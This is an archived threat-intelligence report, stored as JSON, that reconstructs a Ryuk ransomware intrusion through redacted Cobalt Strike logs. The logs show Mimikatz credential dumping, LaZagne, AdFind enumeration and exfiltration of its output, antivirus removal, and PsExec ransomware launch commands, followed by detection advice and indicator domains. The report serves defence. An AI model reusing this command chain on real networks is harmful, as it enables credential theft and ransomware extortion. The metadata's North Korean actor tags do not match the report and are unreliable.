{
    "id": "b1865091-db9c-4f04-9dac-c3a39bda770b",
    "created_at": "2023-01-12T15:05:12.141145Z",
    "updated_at": "2025-03-27T02:15:49.375414Z",
    "deleted_at": null,
    "sha1_hash": "994ece50b67dd80d28ffede9089928c6dead8598",
    "title": "2020-11-06 - Anatomy of Attack- Inside BazarBackdoor to Ryuk Ransomware -one- Group via Cobalt Strike",
    "authors": "",
    "file_creation_date": "2022-05-28T04:43:39Z",
    "file_modification_date": "2022-05-28T04:43:39Z",
    "file_size": 886659,
    "plain_text": "# Anatomy of Attack: Inside BazarBackdoor to Ryuk Ransomware \"one\" Group via Cobalt Strike\n\n**[advanced-intel.com/post/anatomy-of-attack-inside-bazarbackdoor-to-ryuk-ransomware-one-group-via-cobalt-strike](https://www.advanced-intel.com/post/anatomy-of-attack-inside-bazarbackdoor-to-ryuk-ransomware-one-group-via-cobalt-strike)**\n\nAdvIntel November 6, 2020\n\nNov 6, 2020\n\n4 min read\n\n**By Vitali Kremez**\n\nAn intimate look at the Ryuk \"one\" adversaries\n\n\n-----\n\nDuring one routine AdvIntel incident response engagement and enhanced visibility, we were\nable to obtain additional insights into the exact attack kill-chain executed by the Ryuk\nransomware “one” group via Cobalt Strike toolkit.\n\nThe group behind Ryuk ransomware distribution, referenced as \"one\" continues to target\nvarious industries including healthcare relying on BazarBackdoor. Currently, the healthcare\nand social services targeting comprises 13.36% of the total victim by industries.\n\n**Ryuk “one” Adversary Dossier**\n\n**Average Payment: 48 Bitcoin**\n\n**Largest Confirmed Payment: 2,200 Bitcoin**\n\n**Crime Salary: Over $150 Million in Bitcoin**\n\n**Psychology Type: Tough Negotiator, Rare Leniency**\n\n**Actor Origin: Russian-speaking Eastern Europe**\n\n**Reliability: High**\n\n**Recent Sector Breach Activities:**\n\nTechnology\n\nHealthcare\n\nEnergy\n\n\n-----\n\nFinancial services\n\nGovernment\n\nThe group behind prefers to leverage pentester toolkits favoriting Cobalt Strike beacon as an\nimmediate post-exploitation payload of choice. The additional open-source toolkits they rely\non are Mimikatz, PowerShell PowerSploit, LaZagne, AdFind, Bloodhound, and PsExec.\n\nHere is the Cobalt Strike exploitation anatomy of the attack (AoA) exploitation of breach\ngroup (\"one\") from one of the latest high-profile \"Ryuk\" ransomware victims in 15 steps\npivoted from the \"BazarBackdoor\" infection:\n\n**1. Examine domain admin via \"Invoke-DACheck\" script**\n\n**2. Collect host passwords via Mimikatz \"mimikatz's sekurlsa::logonpasswords\"**\n\n**3. Revert token and create a token for the administrative comment from the Mimikatz**\n**command output**\n\n**4. Review the network of the host via \"net view\"**\n\n**5. Portscan for FTP, SSH, SMB, RDP, VNC protocols**\n\n\n-----\n\n**6. List accesses on the available hosts**\n\n**7. Upload active directory finder \"AdFind\" kit with the batch script \"adf.bat\" from the**\n**\"net view\" and portscanned hosts**\n\n**8. Display the antivirus name on the host via \"WMIC\" command**\n\n**9. Upload multi-purpose password recovery tool \"LaZagne\" to scan the host**\n\n**10. Remove the password recovery tool**\n\n**11. Run ADFind and save outputs**\n\n**12. Delete AdFind tool artifacts and download outputs**\n\n**13. Grant net share full access to all for Ryuk ransomware**\n\n**14. Upload remote execution software \"PSExec\" and prepared network hosts and**\n**uninstall the anti-virus product**\n\n**15. Upload execution batch scripts and the parsed network hosts and run Ryuk**\n**ransomware as via PsExec under different compromised users**\n\nThe full redacted anonymized description of the exact executed Cobalt Strike commands are\nas follows leading to Ryuk ransomware:\n\n**1. Examine domain admin via \"Invoke-DACheck\" script**\n```\n10/09 19:07:39 UTC [task] Tasked beacon to import: /root/CobaltStrike-ToolKit/InvokeDACheck.ps1\n10/09 19:07:39 UTC [task] Tasked beacon to run: Invoke-DACheck -Initial True\n\n```\n**2. Collect host passwords via Mimikatz \"mimikatz's sekurlsa::logonpasswords\"**\n```\n10/09 19:07:39 UTC [task] Tasked beacon to run mimikatz's sekurlsa::logonpasswords\ncommand\n\n```\n**3. Revert token and create a token for the administrative comment from the Mimikatz**\n**command output**\n```\n10/09 19:08:49 UTC [input] rev2self\n10/09 19:08:49 UTC [task] Tasked beacon to revert token\n10/09 19:08:49 UTC [input] make_token REDACTED\\REDACTED REDACTED\n10/09 19:08:49 UTC [task] Tasked beacon to create a token for REDACTED\\Administrator\n\n```\n**4. Review the network of the host via \"net view\"**\n\n\n-----\n\n```\n10/09 19:09:03 UTC [input] net view\n10/09 19:10:12 UTC [input] ls \\\\REDACTED\\C$\n\n```\n**5. Portscan for FTP, SSH, SMB, RDP, VNC protocols**\n```\n10/09 19:11:09 UTC [input] portscan XX.XX.XX.0-XX.XX.XX.255 21,22,445,1433,3389,5900\nicmp 1024\n\n```\n**6. List accesses on the available hosts**\n```\n10/09 19:13:44 UTC [input] ls\\\\REDACTED\\C$\n\n```\n**7. Upload active directory finder \"ADfinder\" kit \"AdFind.exe\" with the batch script**\n**\"adf.bat\" from the \"net view\" and portscanned hosts**\n```\n10/09 19:19:35 UTC [input] upload /root/work/ADfind/adf.bat (REDACTED\\adf.bat)\n10/09 19:19:42 UTC [input] upload /root/work/ADfind/AdFind.exe (REDACTED\\AdFind.exe)\n\n```\n**8. Display the antivirus name on the host via \"WMIC\" command**\n```\n10/09 19:23:12 UTC [input] shell WMIC /Node:localhost\n/Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n\n```\n**9. Upload multi-purpose password recovery tool \"LaZagne\" to scan the host**\n```\n10/09 19:23:29 UTC [input] upload /root/work/lazagne.exe (REDACTED\\lazagne.exe)\n10/09 19:25:22 UTC [input] shell lazagne.exe all\n\n```\n**10. Remove the password recovery tool**\n```\n10/09 19:28:50 UTC [input] rm lazagne.exe\n\n```\n**11. Run ADFind and save the** **output**\n```\nREDACTED>adfind.exe -f \"(objectcategory=person)\" 1>ad_users.txt\nREDACTED>adfind.exe -f \"objectcategory=computer\" 1>ad_computers.txt\nREDACTED>adfind.exe -f \"(objectcategory=organizationalUnit)\" 1>ad_ous.txt\nREDACTED>adfind.exe -subnets -f (objectCategory=subnet) 1>subnets.txt\nREDACTED>adfind.exe -f \"(objectcategory=group)\" 1>ad_group.txt\nREDACTED>adfind.exe -gcb -sc trustdmp 1>trustdmp.txt\n\n```\n**12. Delete AdFind tool artifacts and download outputs**\n\n\n-----\n\n```\n10/09 19:31:02 UTC [input] rm REDACTED\\adf.bat\n10/09 19:31:02 UTC [input] rm REDACTED\\AdFind.exe\n10/09 19:31:33 UTC [input] download REDACTED\\ad_users.txt\n10/09 19:31:33 UTC [input] download REDACTED\\ad_computers.txt\n10/09 19:31:33 UTC [input] download REDACTED\\ad_ous.txt\n10/09 19:31:33 UTC [input] download REDACTED\\ad_group.txt\n10/09 19:31:33 UTC [input] download REDACTED\\subnets.txt\n10/09 19:31:33 UTC [input] download REDACTED\\trustdmp.txt\nstarted download of REDACTED\\ad_users.txt (REDACTED bytes)\nstarted download of REDACTED\\ad_computers.txt (REDACTED bytes)\nstarted download of REDACTED\\ad_ous.txt (REDACTED bytes)\nstarted download of REDACTED\\ad_group.txt (REDACTED bytes)\nstarted download of REDACTED\\subnets.txt (REDACTED bytes)\nstarted download of REDACTED\\trustdmp.txt (REDACTED bytes)\n10/09 19:39:12 UTC [input] rm REDACTED\\ad_users.txt\n10/09 19:39:12 UTC [input] rm REDACTED\\ad_computers.txt\n10/09 19:39:12 UTC [input] rm REDACTED\\ad_ous.txt\n10/09 19:39:12 UTC [input] rm REDACTED\\ad_group.txt\n10/09 19:39:12 UTC [input] rm REDACTED\\subnets.txt\n10/09 19:39:12 UTC [input] rm REDACTED\\trustdmp.txt\n\n```\n**13. Grant net share full access to all for Ryuk ransomware**\n```\n10/09 19:41:24 UTC [input] shell net share aaa$=C:\\aaa /GRANT:Everyone,FULL\n\n```\n**14. Upload remote execution software \"PSExec\" and prepared network hosts and**\n**uninstall local anti-virus**\n```\n10/09 19:42:37 UTC [input] upload /root/work/REDACTED/comps.txt\n(C:\\REDACTED\\comps.txt)\n10/09 20:11:12 UTC [input] shell start \"REDACTED_REMOVE_ANTI_VIRUS\" \n10/09 22:14:38 UTC [input] shell ipconfig\n\n```\n**15. Upload execution batch scripts and the parsed network hosts and run Ryuk**\n**ransomware via PsExec under different compromised users**\n```\n>start PsExec.exe -d @C:\\share\\serv.txt -u DOMAIN\\USER -p PASSWORD cmd /c\nc:\\windows\\temp\\REDACTED.exe\n>start PsExec.exe -d @C:\\REDACTED\\comps.txt -u DOMAIN\\USER -p PASSWORD cmd /c\nc:\\windows\\temp\\REDACTED.exe\n\n```\n**Ryuk Group \"one\" Post-Exploitation Detections & Mitigations:**\n\nDetection of Mimikatz execution across the network host\n\nDetect, alert and flag any reconnaissance activity using \"ipconfig,\" \"net view\" and\n\"nltest\" commands for review\n\nDetect and alert on portscan activity inside the network\n\n\n-----\n\nDetect and alert on PsExec execution across the network\n\nDetect and alert WMIC commands for anti-virus products\n\nDetect and alert AdFinder and LazaGne toolset presence inside the environment\n\nDetect and alert on net share \" /GRANT:Everyone,FULL\" commands\n\n**Indicators of compromise (IOCs):**\n\n_check1domains[.]com_\n\n_sweetmonsterr[.]com_\n\n_qascker[.]com_\n\n_remotessa[.]com_\n\n_havemosts[.]com_\n\n_unlockwsa[.]com_\n\n_sobcase[.]com_\n\n_zhameharden[.]com_\n\n_mixunderax[.]com_\n\n_bugsbunnyy[.]com_\n\n_fastbloodhunter[.]com_\n\n_serviceboosterr[.]com_\n\n_servicewikii[.]com_\n\n_secondlivve[.]com_\n\n_luckyhunterrs[.]com_\n\n_wodemayaa[.]com_\n\n_hybriqdjs[.]com_\n\n_gunsdrag[.]com_\n\n_gungameon[.]com_\n\n\n-----\n\n_servicemount[.]com_\n\n_servicesupdater[.]com_\n\n_service-boosterr[.]com_\n\n_serviceupdatter[.]com_\n\n_dotmaingame[.]com_\n\n_Advanced Intelligence is an elite threat prevention firm. We provide our customers with_\n_tailored support and access to the proprietary industry-leading “Andariel” Platform to achieve_\n_unmatched visibility into botnet breaches, underground and dark web economy and mitigate_\n_any existing or emerging threats._\n\n**Vitali Kremez is the Chairman and CEO of Advanced Intelligence, LLC. Twitter: @VK_Intel.**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-06 - Anatomy of Attack- Inside BazarBackdoor to Ryuk Ransomware -one- Group via Cobalt Strike.pdf"
    ],
    "report_names": [
        "2020-11-06 - Anatomy of Attack- Inside BazarBackdoor to Ryuk Ransomware -one- Group via Cobalt Strike.pdf"
    ],
    "threat_actors": [
        {
            "id": "838f6ced-12a4-4893-991a-36d231d96efd",
            "created_at": "2022-10-25T15:50:23.347455Z",
            "updated_at": "2025-03-27T02:00:55.449316Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "Andariel",
                "Silent Chollima",
                "PLUTONIUM",
                "Onyx Sleet"
            ],
            "source_name": "MITRE:Andariel",
            "tools": [
                "Rifdoor",
                "gh0st RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "110e7160-a8cc-4a66-8550-f19f7d418117",
            "created_at": "2023-01-06T13:46:38.427592Z",
            "updated_at": "2025-03-27T02:00:02.830659Z",
            "deleted_at": null,
            "main_name": "Silent Chollima",
            "aliases": [
                "Subgroup: Andariel",
                "Onyx Sleet",
                "PLUTONIUM",
                "OperationTroy",
                "Guardian of Peace",
                "GOP",
                "WHOis Team",
                "Andariel"
            ],
            "source_name": "MISPGALAXY:Silent Chollima",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4a502340-ae29-4a3a-8142-7fbbc2ec79b5",
            "created_at": "2024-05-01T02:03:08.138302Z",
            "updated_at": "2025-03-27T02:05:17.416542Z",
            "deleted_at": null,
            "main_name": "NICKEL HYATT",
            "aliases": [
                "Dark Seoul",
                "Jumpy Pisces ",
                "Onyx Sleet ",
                "RIFLE Campaign",
                "Silent Chollima ",
                "Andariel"
            ],
            "source_name": "Secureworks:NICKEL HYATT",
            "tools": [
                " DTrack",
                " Rifle",
                " UnitBot",
                " Valefor",
                "ActiveX 0-day"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bc6e3644-3249-44f3-a277-354b7966dd1b",
            "created_at": "2022-10-25T16:07:23.760559Z",
            "updated_at": "2025-03-27T02:02:09.968605Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "APT 45",
                "Andariel",
                "Jumpy Pisces",
                "Onyx Sleet",
                "Operation BLACKMINE",
                "Operation BLACKSHEEP/Phase 3.",
                "Operation Blacksmith",
                "Operation DESERTWOLF/Phase 3",
                "Operation GHOSTRAT",
                "Operation GoldenAxe",
                "Operation INITROY/Phase 1",
                "Operation INITROY/Phase 2",
                "Operation Mayday",
                "Operation VANXATM",
                "Operation XEDA",
                "Plutonium",
                "Silent Chollima",
                "Stonefly"
            ],
            "source_name": "ETDA:Andariel",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535912,
    "ts_updated_at": 1743041749,
    "ts_creation_date": 1653713019,
    "ts_modification_date": 1653713019,
    "files": {
        "pdf": "https://archive.orkl.eu/994ece50b67dd80d28ffede9089928c6dead8598.pdf",
        "text": "https://archive.orkl.eu/994ece50b67dd80d28ffede9089928c6dead8598.txt",
        "img": "https://archive.orkl.eu/994ece50b67dd80d28ffede9089928c6dead8598.jpg"
    }
}